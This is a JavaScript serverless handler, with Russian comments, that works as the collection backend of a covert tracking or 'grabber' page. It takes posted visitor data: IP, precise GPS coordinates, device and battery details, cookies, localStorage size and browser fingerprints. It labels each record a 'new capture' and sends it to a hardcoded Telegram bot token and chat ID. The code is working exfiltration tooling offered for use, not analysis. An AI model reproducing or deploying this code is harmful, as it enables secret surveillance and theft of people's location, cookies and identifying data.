export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).end();

    const data = req.body;
    const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
    const CHAT_ID = "8510274209";

    const ip = data.ip || "неизв";

    // Гео: сначала точные координаты, если нет – город по IP
    let geoStr = "не определена";
    if (data.geo && data.geo.lat) {
        geoStr = `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)} (точность ${data.geo.accuracy}м)`;
    } else if (data.geoIP && data.geoIP.city) {
        geoStr = `${data.geoIP.city}, ${data.geoIP.regionName || ""}, ${data.geoIP.country || ""}`;
        if (data.geoIP.isp) geoStr += `\n🛜 Провайдер: ${data.geoIP.isp}`;
    }

    const localIP = data.localIP ? `\n📍 Локальный IP: ${data.localIP}` : "";
    const device = `${data.platform || "?"}, ${data.screen || "?"}, ${data.orientation || ""}`;
    const battery = data.battery || "неизв";
    const network = data.network || "неизв";
    const memory = data.deviceMemory ? `${data.deviceMemory} ГБ` : "неизв";
    const cores = data.hardwareConcurrency || "?";
    const cookies = data.cookies || "нет";
    const localStorageSize = data.localStorage ? data.localStorage.length : 0;

    const dateStr = new Date(data.timestamp).toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    const message = [
        `💀 **НОВЫЙ ЗАХВАТ**`,
        `🕒 **Дата:** ${dateStr}`,
        ``,
        `📍 **IP:** \`${ip}\`${localIP}`,
        `🌍 **Гео:** ${geoStr}`,
        `📱 **Устройство:** ${device}`,
        `🔋 **Батарея:** ${battery}`,
        `📶 **Сеть:** ${network}`,
        `🧠 **CPU:** ${cores} ядер | RAM: ${memory}`,
        `🍪 **Cookies:** ${cookies}`,
        `📦 **LocalStorage:** ${localStorageSize} символов`,
        ``,
        `📄 **Фингерпринты:**`,
        `Canvas: ${data.canvas ? data.canvas.substring(0,40)+"…" : "нет"}`,
        `WebGL: ${data.webgl || "нет"}`,
        `Audio: ${data.audio || "нет"}`,
        `Плагины: ${data.plugins || "нет"}`,
        `MIME: ${data.mimeTypes || "нет"}`,
        `Шрифты: ${data.fonts || "нет"}`,
        `Языки: ${(data.languages || []).join(", ")}`,
        `Часовой пояс: ${data.timezone || "?"}`,
        `Do Not Track: ${data.doNotTrack || "?"}`,
        `Онлайн: ${data.online ? "да" : "нет"}`,
        `Referrer: ${data.referrer || "нет"}`,
        `URL: ${data.url || "нет"}`
    ].join("\n");

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown",
                disable_web_page_preview: true
            })
        });
    } catch (error) {
        console.error("Ошибка отправки:", error);
    }

    res.status(200).json({ status: "ok" });
}
